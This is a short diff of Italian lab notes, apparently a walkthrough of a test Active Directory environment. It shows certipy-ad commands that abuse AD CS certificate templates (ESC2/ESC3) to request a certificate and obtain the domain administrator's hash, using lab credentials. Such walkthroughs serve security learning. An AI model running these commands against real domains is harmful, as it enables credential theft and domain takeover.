@@ -228,7 +228,7 @@ Usando poi il certificato ottieni l'hash dell'amministratore
 certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12
 ```
 ![[Pasted image 20230828150041.png]]
-### **ESC 2 - ADCS**
+### **ESC 2 & 3 - ADCS**
 Prendi il certificato usando certipy
 ```bash
 certipy-ad req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template ESC2 -ca ESSOS-CA
@@ -244,8 +244,10 @@ Ora usando il suo certificato prendi l'hash
 certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12
 ```
 ![[Pasted image 20230828150913.png]]
-### **ESC 3 - ADCS**
 ### **ESC 4 - ADCS**
+```bash
+
+```
 ### **ESC 6 - ADCS**
 ### **ESC 8 - ADCS**
 
